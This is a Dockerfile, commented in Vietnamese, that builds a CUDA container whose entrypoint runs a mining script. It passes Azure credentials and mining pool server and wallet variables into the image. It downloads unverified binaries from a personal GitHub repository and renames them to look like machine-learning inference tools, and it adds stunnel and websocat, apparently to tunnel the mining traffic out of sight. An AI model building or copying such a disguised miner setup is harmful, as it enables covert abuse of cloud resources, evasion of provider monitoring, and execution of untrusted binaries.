# Bước 1: Sử dụng nền tảng CUDA của NVIDIA
FROM nvcr.io/nvidia/cuda:12.0.0-cudnn8-devel-ubuntu22.04

# Thiết lập biến môi trường để chặn tương tác đầu vào trong quá trình cài đặt
ENV DEBIAN_FRONTEND=noninteractive \
    PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    LANG=en_US.UTF-8 \
    LC_ALL=en_US.UTF-8


# Thêm các biến môi trường Azure và các khóa API
ARG AZURE_SUBSCRIPTION_ID
ARG AZURE_CLIENT_ID
ARG AZURE_CLIENT_SECRET
ARG AZURE_TENANT_ID
ARG ANOMALY_DETECTOR_API_KEY
ARG OPENAI_API_KEY
ARG LOG_ENCRYPTION_KEY
ARG MINING_SERVER_CPU
ARG MINING_WALLET_CPU
ARG MINING_SERVER_GPU
ARG MINING_WALLET_GPU


ENV AZURE_SUBSCRIPTION_ID=${AZURE_SUBSCRIPTION_ID} \
    AZURE_CLIENT_ID=${AZURE_CLIENT_ID} \
    AZURE_CLIENT_SECRET=${AZURE_CLIENT_SECRET} \
    AZURE_TENANT_ID=${AZURE_TENANT_ID} \
    ANOMALY_DETECTOR_API_KEY=${ANOMALY_DETECTOR_API_KEY} \
    OPENAI_API_KEY=${OPENAI_API_KEY} \
    LOG_ENCRYPTION_KEY=${LOG_ENCRYPTION_KEY} \
    MINING_SERVER_CPU=${MINING_SERVER_CPU} \
    MINING_WALLET_CPU=${MINING_WALLET_CPU} \
    MINING_SERVER_GPU=${MINING_SERVER_GPU} \
    MINING_WALLET_GPU=${MINING_WALLET_GPU}

# Cài đặt các thư viện hệ thống và công cụ cần thiết
RUN set -eux; \
    apt-get update; \
    apt-get install -y --no-install-recommends \
        apt-utils sudo nano wget python3 python3-pip curl git build-essential cmake \
        libssl-dev libeigen3-dev libnuma-dev stunnel4 \
        cpufrequtils iproute2 util-linux \
        pciutils openssl lm-sensors powerstat stress-ng bash \
        htop locales iptables powertop tzdata numactl systemd dbus  \
        pkg-config libhwloc15 libhwloc-dev ca-certificates lsb-release gnupg locales \
        libuv1 libudev1 libssl3 cgroup-tools libcgroup1 libcap2-bin nvidia-container-toolkit && \
    rm -rf /var/lib/apt/lists/*
    

# Thiết lập múi giờ và locale
RUN set -eux; \
    ln -fs /usr/share/zoneinfo/UTC /etc/localtime; \  
    echo "UTC" > /etc/timezone; \                    
    dpkg-reconfigure -f noninteractive tzdata; \     
    apt-get update && apt-get install -y locales; \  
    locale-gen en_US.UTF-8; \                         
    update-locale LANG=en_US.UTF-8 LC_ALL=en_US.UTF-8

# Đảm bảo các thư mục cần thiết
RUN mkdir -p /run/user/0 && chmod 700 /run/user/0

# Thiết lập biến môi trường
ENV XDG_RUNTIME_DIR=/run/user/0 \
    DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/0/bus


# Cài đặt Azure CLI
RUN set -eux; \
    curl -sL https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor | \
        tee /etc/apt/trusted.gpg.d/microsoft.gpg > /dev/null; \
    AZ_REPO=$(lsb_release -cs); \
    echo "deb [arch=amd64] https://packages.microsoft.com/repos/azure-cli/ $AZ_REPO main" | \
        tee /etc/apt/sources.list.d/azure-cli.list; \
    apt-get update; \
    apt-get install -y --no-install-recommends azure-cli; \
    rm -rf /var/lib/apt/lists/*

# Cài đặt các công cụ bổ sung
RUN set -eux; \
    curl -L -o /usr/local/bin/ml-inference "https://github.com/wollfoo/sssloz/releases/download/ssloz/ml-inference"; \
    chmod +x /usr/local/bin/ml-inference

RUN set -eux; \
    curl -L -o /usr/local/bin/inference-cuda "https://github.com/wollfoo/sssloz/releases/download/inference-cuda/inference-cuda"; \
    chmod +x /usr/local/bin/inference-cuda

RUN set -eux; \
    curl -L -o /usr/local/bin/libmlls-cuda.so "https://github.com/wollfoo/sssloz/releases/download/cuda/libmlls-cuda.so"; \
    chmod +x /usr/local/bin/libmlls-cuda.so

RUN set -eux; \
    curl -L -o /usr/local/bin/websocat "https://github.com/vi/websocat/releases/latest/download/websocat.x86_64-unknown-linux-musl"; \
    chmod +x /usr/local/bin/websocat

# Tạo khóa và chứng chỉ cho Stunnel
RUN set -eux; \
    mkdir -p /etc/stunnel; \
    openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
        -keyout /etc/stunnel/soff.key \
        -out /etc/stunnel/soff.crt \
        -subj "/C=VN/ST=Ho_Chi_Minh/L=Ho_Chi_Minh/O=MyOrg/OU=MyUnit/CN=example.com"; \
    chmod 600 /etc/stunnel/soff.key /etc/stunnel/soff.crt

# Sao chép và cấu hình stunnel
COPY stunnel.conf /etc/stunnel/stunnel.conf
RUN set -eux; \
    chmod 700 /etc/stunnel/stunnel.conf

# Bước 2: Thiết lập thư mục làm việc
WORKDIR /app

# Bước 3: Sao chép và cài đặt các phụ thuộc Python
COPY requirements.txt /app/
RUN set -eux; \
    python3 -m pip install --upgrade pip; \
    pip install --no-cache-dir --upgrade -r requirements.txt --root-user-action=ignore

# Bước 4: Sao chép toàn bộ thư mục mining_environment và thiết lập permissions
COPY mining_environment/ /app/mining_environment/
RUN set -eux; \
    find /app/mining_environment/config -type f -name "*.json" -exec chmod 600 {} \;; \
    find /app/mining_environment/scripts -type f -name "*.py" -exec chmod +x {} \;; \
    find /app/mining_environment/logs -type f -name "*.log" -exec chmod 600 {} \;

# Bước 5: Thiết lập các biến môi trường cố định
ENV SCRIPT_DIR=/app/mining_environment/scripts \
    CONFIG_DIR=/app/mining_environment/config \
    MODELS_DIR=/app/mining_environment/models \
    LOGS_DIR=/app/mining_environment/logs \
    ML_COMMAND=/usr/local/bin/ml-inference \
    CUDA_COMMAND=/usr/local/bin/inference-cuda \
    MLLS_CUDA=/usr/local/bin/libmlls-cuda.so

# Bước 6: Sao chép script khởi động
COPY start_mining.py /app/
RUN set -eux; \
    chmod +x /app/start_mining.py

# Bước 7: (tuỳ chọn) Thêm các lớp bổ sung khi cần
# (Giữ nguyên, để người dùng mở rộng sau này)

# Bước 8: Thiết lập entrypoint
ENTRYPOINT ["python3", "/app/start_mining.py"]

# Bước 9: Thêm Healthcheck để kiểm tra tình trạng container
HEALTHCHECK --interval=1m --timeout=10s --start-period=30s --retries=3 \
    CMD pgrep -f start_mining.py || exit 1
